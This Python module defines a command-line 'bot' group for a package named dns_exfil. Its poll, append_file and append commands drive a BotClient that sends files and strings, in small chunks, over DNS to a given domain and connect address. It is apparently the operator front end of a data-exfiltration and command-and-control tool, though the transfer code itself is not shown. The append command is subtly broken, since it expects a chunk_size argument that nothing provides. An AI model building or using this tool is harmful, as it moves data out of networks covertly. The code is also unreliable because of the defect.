import click
from dns_exfil.exfiltrators.botexfiltrator.client import BotClient

@click.command(name='poll')
@click.option('--domain', default='example.com', help='ending domain name')
@click.argument('connect')
def bot_poll(domain, connect):
    client = BotClient(domain, connect)
    client.bot()

@click.command(name='append_file')
@click.option('--domain', default='example.com', help='ending domain name')
@click.option('--chunk_size', help='size in bytes to transfer in each packet', default=30, type=int)
@click.argument('connect')
@click.argument('filename')
def bot_append_file(domain, chunk_size, connect, filename):
    client = BotClient(domain, connect)
    client.append_file(filename, chunk_size)

@click.command(name='append')
@click.option('--domain', default='example.com', help='ending domain name')
@click.argument('connect')
@click.argument('filename')
@click.argument('string')
def bot_append(domain, chunk_size, connect, filename, string):
    string += '\n'
    client = BotClient(domain, connect)
    client.append(string.encode('utf-8'), filename)


@click.group(name='bot')
def bot_client():
    pass

bot_client.add_command(bot_poll)
bot_client.add_command(bot_append_file)
bot_client.add_command(bot_append)

